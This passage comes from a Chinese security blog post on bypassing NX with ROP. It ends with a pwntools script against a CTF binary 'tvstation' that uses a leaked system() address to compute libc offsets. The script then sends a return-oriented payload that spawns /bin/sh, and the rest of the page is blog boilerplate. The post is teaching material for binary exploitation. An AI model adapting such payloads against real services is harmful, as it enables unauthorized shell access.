+<p>因此可以构造脚本如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#coding:"utf-8"</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io=process(<span class="string">'./tvstation'</span>)</span><br><span class="line"><span class="comment">#elf=ELF('./libc.so.6_x64')</span></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">": "</span>)</span><br><span class="line">io.sendline(<span class="string">'4'</span>)					<span class="comment">#跳转到debug()</span></span><br><span class="line">io.recvuntil(<span class="string">"@0x"</span>)</span><br><span class="line">system_addr = int(io.recv(<span class="number">12</span>), <span class="number">16</span>)	<span class="comment">#读取输出的system函数在内存中的地址</span></span><br><span class="line">libc_start = system_addr - <span class="number">0x456a0</span>	<span class="comment">#根据偏移计算libc在内存中的首地址</span></span><br><span class="line">pop_rdi_addr = <span class="number">0x400c13</span>	<span class="comment">#pop rdi; ret 在内存中的地址，给system函数传参</span></span><br><span class="line">binsh_addr = libc_start + <span class="number">0x18AC40</span>	<span class="comment">#"/bin/sh"字符串在内存中的地址</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">""</span></span><br><span class="line">payload += <span class="string">'A'</span>*<span class="number">40</span>					<span class="comment">#padding</span></span><br><span class="line">payload += p64(pop_rdi_addr)		<span class="comment">#pop rdi; ret</span></span><br><span class="line">payload += p64(binsh_addr)			<span class="comment">#system函数参数</span></span><br><span class="line">payload += p64(system_addr)			<span class="comment">#调用system()执行system("/bin/sh")</span></span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="⌛待更新…"><a href="#⌛待更新…" class="headerlink" title="⌛待更新…"></a>⌛待更新…</h3>
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+      <div>
+        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+  <div>您的支持是我最大的动力︿(￣︶￣)︿</div>
+  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+    <span>Donate</span>
+  </button>
+  <div id="QR" style="display: none;">
+
+    
+      <div id="wechat" style="display: inline-block">
+        <img id="wechat_qr" src="/images/wechat.jpg" alt="Hvnt3r WeChat Pay"/>
+        <p>WeChat Pay</p>
+      </div>
+    
+
+    
+      <div id="alipay" style="display: inline-block">
+        <img id="alipay_qr" src="/images/alipay.jpg" alt="Hvnt3r Alipay"/>
+        <p>Alipay</p>
+      </div>
+    
+
+    
+
+  </div>
+</div>
+
+      </div>
+    
+
+    
+      <div>
+        <ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>Post author:</strong>
+    Hvnt3r
+  </li>
+  <li class="post-copyright-link">
+    <strong>Post link:</strong>
+    <a href="https://hvnt3r.top/2018/10/二进制安全之ROP/" title="二进制安全之NX绕过方法--ROP">https://hvnt3r.top/2018/10/二进制安全之ROP/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice: </strong>
+    All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0</a> unless stating additionally.
+  </li>
+</ul>
+
+      </div>
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/PWN/" rel="tag"><i class="fa fa-tag"></i> PWN</a>
+          
+            <a href="/tags/CTF/" rel="tag"><i class="fa fa-tag"></i> CTF</a>
+          
+            <a href="/tags/ROP/" rel="tag"><i class="fa fa-tag"></i> ROP</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/10/Shell-code的编写和利用/" rel="next" title="Shellcode的编写和利用">
+                <i class="fa fa-chevron-left"></i> Shellcode的编写和利用
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/10/IDA-Pro远程调试/" rel="prev" title="IDA Pro远程调试">
+                IDA Pro远程调试 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/avatar.png"
+                alt="Hvnt3r" />
+            
+              <p class="site-author-name" itemprop="name">Hvnt3r</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives">
+              
+                  <span class="site-state-item-count">34</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">15</span>
+                  <span class="site-state-item-name">categories</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">31</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/Hvnt3r" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:hvnt3r@foxmail.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#二进制安全之NX绕过方法–ROP技术"><span class="nav-number">1.</span> <span class="nav-text">二进制安全之NX绕过方法–ROP技术</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#64位ELF的ROP"><span class="nav-number">1.1.</span> <span class="nav-text">64位ELF的ROP</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#无system函数时调用int-0x80完成ROP"><span class="nav-number">1.2.</span> <span class="nav-text">无system函数时调用int 0x80完成ROP</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#使用Got表中的函数进行ROP"><span class="nav-number">1.3.</span> <span class="nav-text">使用Got表中的函数进行ROP</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ROP之ret2libc"><span class="nav-number">1.4.</span> <span class="nav-text">ROP之ret2libc</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#⌛待更新…"><span class="nav-number">1.4.1.</span> <span class="nav-text">⌛待更新…</span></a></li></ol></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        
+<div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Hvnt3r</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+      <span class="post-meta-item-text">Site words total count&#58;</span>
+    
+    <span title="Site words total count">33.7k</span>
+  
+</div>
+
+
+
+
+<!-- 
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>
+
+-->
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+  
+  
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/three/three.min.js"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/three/canvas_lines.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"></script>
+  <script>AV.initialize("Mlz03BBADnvOzP0kDTeS9A4a-gzGzoHsz", "gbVyqV9usci1PKnM7hcg3uCv");</script>
+  <script>
+    function showTime(Counter) {
+      var query = new AV.Query(Counter);
+      var entries = [];
+      var $visitors = $(".leancloud_visitors");
+
+      $visitors.each(function () {
+        entries.push( $(this).attr("id").trim() );
+      });
+
+      query.containedIn('url', entries);
+      query.find()
+        .done(function (results) {
+          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';
+
+          if (results.length === 0) {
+            $visitors.find(COUNT_CONTAINER_REF).text(0);
+            return;
+          }
+
+          for (var i = 0; i < results.length; i++) {
+            var item = results[i];
+            var url = item.get('url');
+            var time = item.get('time');
+            var element = document.getElementById(url);
+
+            $(element).find(COUNT_CONTAINER_REF).text(time);
+          }
+          for(var i = 0; i < entries.length; i++) {
+            var url = entries[i];
+            var element = document.getElementById(url);
+            var countSpan = $(element).find(COUNT_CONTAINER_REF);
+            if( countSpan.text() == '') {
+              countSpan.text(0);
+            }
+          }
+        })
+        .fail(function (object, error) {
+          console.log("Error: " + error.code + " " + error.message);
+        });
+    }
+
+    function addCount(Counter) {
+      var $visitors = $(".leancloud_visitors");
+      var url = $visitors.attr('id').trim();
+      var title = $visitors.attr('data-flag-title').trim();
+      var query = new AV.Query(Counter);
+
+      query.equalTo("url", url);
+      query.find({
+        success: function(results) {
+          if (results.length > 0) {
+            var counter = results[0];
+            counter.fetchWhenSave(true);
+            counter.increment("time");
+            counter.save(null, {
+              success: function(counter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(counter.get('time'));
+              },
+              error: function(counter, error) {
+                console.log('Failed to save Visitor num, with error message: ' + error.message);
+              }
+            });
+          } else {
+            var newcounter = new Counter();
+            /* Set ACL */
+            var acl = new AV.ACL();
+            acl.setPublicReadAccess(true);
+            acl.setPublicWriteAccess(true);
+            newcounter.setACL(acl);
+            /* End Set ACL */
+            newcounter.set("title", title);
+            newcounter.set("url", url);
+            newcounter.set("time", 1);
+            newcounter.save(null, {
+              success: function(newcounter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
+              },
+              error: function(newcounter, error) {
+                console.log('Failed to create');
+              }
+            });
+          }
+        },
+        error: function(error) {
+          console.log('Error:' + error.code + " " + error.message);
+        }
+      });
+    }
+
+    $(function() {
+      var Counter = AV.Object.extend("Counter");
+      if ($('.leancloud_visitors').length == 1) {
+        addCount(Counter);
+      } else if ($('.post-title-link').length > 1) {
+        showTime(Counter);
+      }
+    });
+  </script>
+
+
+
+  
+
+  
+
+  
+  
+
+  
+  
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Config({
+        tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+      });
+    </script>
+
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+      });
+    </script>
+    <script type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.1/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>
+  
+
+
+  
+
+  
+  <script type="text/javascript" src="/js/src/exturl.js?v=5.1.4"></script>
+
+
+  
+<script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/koharu.model.json"},"display":{"position":"right","width":100,"height":200},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
+<script type="text/javascript" src="/js/src/love.js"></script>
